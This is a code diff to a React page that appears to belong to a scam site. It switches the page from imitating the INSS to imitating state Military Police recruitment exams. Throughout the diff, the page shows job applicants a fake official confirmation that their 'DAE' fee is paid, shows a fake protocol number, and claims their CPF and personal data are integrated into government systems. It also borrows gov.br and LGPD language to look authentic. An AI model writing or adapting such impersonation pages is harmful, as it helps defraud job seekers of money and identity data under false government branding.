@@ -2,7 +2,8 @@ import { useEffect, useState } from 'react';
 import { useLocation } from 'wouter';
 import { ExercitoHeader } from '@/components/ExercitoHeader';
 import { CheckCircle2, Shield } from 'lucide-react';
-import logoEsocial from '@assets/logo_INSS_1786320311202.png';
+import orgLogo from '@assets/logo-mj_1779836627251.png';
+import { useEstadoPM } from '@/hooks/useEstadoPM';
 
 interface UserInfo {
   firstName: string;
@@ -19,6 +20,9 @@ const g = (gender: string, m: string, f: string) =>
 
 export default function ESocialConfirmadoPage() {
   const [, navigate] = useLocation();
+  const estadoPM = useEstadoPM();
+  const sigla = estadoPM?.sigla ?? 'PM';
+  const nomeCompleto = estadoPM?.nomeCompleto ?? 'Polícias Militares estaduais';
   const [userInfo, setUserInfo] = useState<UserInfo>({
     firstName: '', fullName: '', cpf: '', cargo: '', gender: 'M', telefone: '', email: '',
   });
@@ -55,8 +59,8 @@ export default function ESocialConfirmadoPage() {
     const email = parsedCandidate?.capturaData?.email || parsedUser?.email || '';
 
     const CARGO_MAP: Record<string, string> = {
-      'tecnico-administrativo': 'Técnico Administrativo',
-      'tecnico-nivel-medio':    'Técnico de Nível Médio',
+      'soldado-pm': 'Soldado de 2ª Classe PM',
+      'oficial-pm': 'Aspirante-a-Oficial PM',
     };
     let cargo = '';
     try {
@@ -65,7 +69,7 @@ export default function ESocialConfirmadoPage() {
     } catch (_) {}
     if (!cargo) {
       const key = parsedCandidate?.vagaSelecionada?.key || parsedCandidate?.cargo || parsedUser?.cargo || '';
-      cargo = CARGO_MAP[key] || CARGO_MAP[key?.toLowerCase()] || 'Técnico Administrativo';
+      cargo = CARGO_MAP[key] || CARGO_MAP[key?.toLowerCase()] || 'Soldado de 2ª Classe PM';
     }
 
     setUserInfo({ firstName, fullName, cpf, cargo, gender, telefone, email });
@@ -74,19 +78,19 @@ export default function ESocialConfirmadoPage() {
     try {
       const payment = JSON.parse(localStorage.getItem('esocialPaymentConfirmed') || 'null');
       if (payment?.transactionId) {
-        setProtocolNumber('INSS-' + payment.transactionId.substring(0, 10).toUpperCase());
+        setProtocolNumber(sigla + '-' + payment.transactionId.substring(0, 10).toUpperCase());
       } else {
-        setProtocolNumber('INSS-' + Date.now().toString(36).toUpperCase());
+        setProtocolNumber(sigla + '-' + Date.now().toString(36).toUpperCase());
       }
     } catch (_) {
-      setProtocolNumber('INSS-' + Date.now().toString(36).toUpperCase());
+      setProtocolNumber(sigla + '-' + Date.now().toString(36).toUpperCase());
     }
 
     // Confirmation deadline (+2 business days)
     const agora = new Date();
     agora.setDate(agora.getDate() + 2);
     setDataConfirmacao(agora.toLocaleDateString('pt-BR', { weekday: 'long', day: '2-digit', month: 'long', year: 'numeric' }));
-  }, []);
+  }, [sigla]);
 
   const maskCPF = (cpf: string) => {
     if (!cpf || cpf.length < 11) return '•••.•••.•••-••';
@@ -101,7 +105,7 @@ export default function ESocialConfirmadoPage() {
 
   return (
     <div className="min-h-screen bg-white flex flex-col" style={{ fontFamily: "'Rawline','Open Sans',sans-serif" }}>
-      <ExercitoHeader customTitle="Concurso Público INSS 2026 · eSocial" customSubtitle="Regularização DAE — Etapa Concluída" block_name={false} />
+      <ExercitoHeader customTitle={`Concurso ${sigla} 2026 · eSocial`} customSubtitle="Regularização DAE — Etapa Concluída" block_name={false} />
 
       <div className="flex-1 py-8">
         <div className="max-w-xl mx-auto px-4 space-y-6">
@@ -110,7 +114,7 @@ export default function ESocialConfirmadoPage() {
           <div className="flex items-start gap-3 border-b border-gray-200 pb-4">
             <CheckCircle2 className="w-8 h-8 text-[#168821] flex-shrink-0 mt-0.5" />
             <div>
-              <p className="text-xs text-[#168821] font-semibold uppercase tracking-wide">DAE-INSS · Pagamento Confirmado</p>
+              <p className="text-xs text-[#168821] font-semibold uppercase tracking-wide">DAE-{sigla} · Pagamento Confirmado</p>
               <h1 className="text-lg font-bold text-gray-800">
                 {n ? `${n}, sua integração cadastral foi processada.` : 'Sua integração cadastral foi processada.'}
               </h1>
@@ -124,7 +128,7 @@ export default function ESocialConfirmadoPage() {
           <div className="space-y-4 text-sm text-gray-700 leading-relaxed">
 
             <p>
-              {n ? `${n}, a` : 'A'} partir deste momento, seus dados pessoais e funcionais encontram-se devidamente integrados aos sistemas do INSS. A regularização abrange os módulos de Controle de Pessoal, CNIS/Dataprev e a base de dados do Concurso Público INSS 2026, conforme exigido pelo processo seletivo ao qual você está inscrit{ela}.
+              {n ? `${n}, a` : 'A'} partir deste momento, seus dados pessoais e funcionais encontram-se devidamente integrados aos sistemas da {sigla}. A regularização abrange os módulos de Controle de Pessoal, CNIS/Dataprev e a base de dados do Concurso {sigla} 2026, conforme exigido pelo processo seletivo ao qual você está inscrit{ela}.
             </p>
 
             <p>
@@ -134,7 +138,7 @@ export default function ESocialConfirmadoPage() {
             <div className="bg-gray-50 border-l-4 border-[#0063AF] p-4 rounded-r-lg">
               <p className="font-semibold text-[#004D8C] mb-2">O que acontece agora</p>
               <p>
-                Nos próximos <strong>2 a 3 dias úteis</strong>, a equipe de coordenação do INSS irá processar sua inscrição e verificar a conformidade dos dados integrados. Após essa etapa de validação interna, você receberá uma mensagem de confirmação com todos os detalhes necessários para comparecer ao dia da avaliação.
+                Nos próximos <strong>2 a 3 dias úteis</strong>, a equipe de coordenação da {sigla} irá processar sua inscrição e verificar a conformidade dos dados integrados. Após essa etapa de validação interna, você receberá uma mensagem de confirmação com todos os detalhes necessários para comparecer ao dia da avaliação.
               </p>
             </div>
 
@@ -176,11 +180,11 @@ export default function ESocialConfirmadoPage() {
             </p>
 
             <p>
-              Para dúvidas sobre o processo seletivo, condições de participação ou critérios de avaliação, acesse o portal oficial do INSS em <strong>gov.br/inss</strong>. Não compartilhe seu número de protocolo com terceiros, pois ele está vinculado exclusivamente à sua identidade cadastral.
+              Para dúvidas sobre o processo seletivo, condições de participação ou critérios de avaliação, acesse o portal oficial da {sigla} em <strong>gov.br</strong>. Não compartilhe seu número de protocolo com terceiros, pois ele está vinculado exclusivamente à sua identidade cadastral.
             </p>
 
             <p className="text-xs text-gray-500 border-t border-gray-100 pt-4">
-              Integração processada em conformidade com a legislação federal e as normas do INSS para o Concurso Público 2026. Os dados informados são tratados nos termos da Lei nº 13.709/2018 (LGPD). Protocolo: {protocolNumber}.
+              Integração processada em conformidade com a legislação federal e as normas da {sigla} para o Concurso Público 2026. Os dados informados são tratados nos termos da Lei nº 13.709/2018 (LGPD). Protocolo: {protocolNumber}.
             </p>
           </div>
 
@@ -192,7 +196,7 @@ export default function ESocialConfirmadoPage() {
           </div>
 
           <div className="flex justify-center pb-6">
-            <img src={logoEsocial} alt="INSS — Instituto Nacional do Seguro Social" className="h-10 opacity-70 object-contain" />
+            <img src={orgLogo} alt={nomeCompleto} className="h-10 opacity-70 object-contain" />
           </div>
 
         </div>
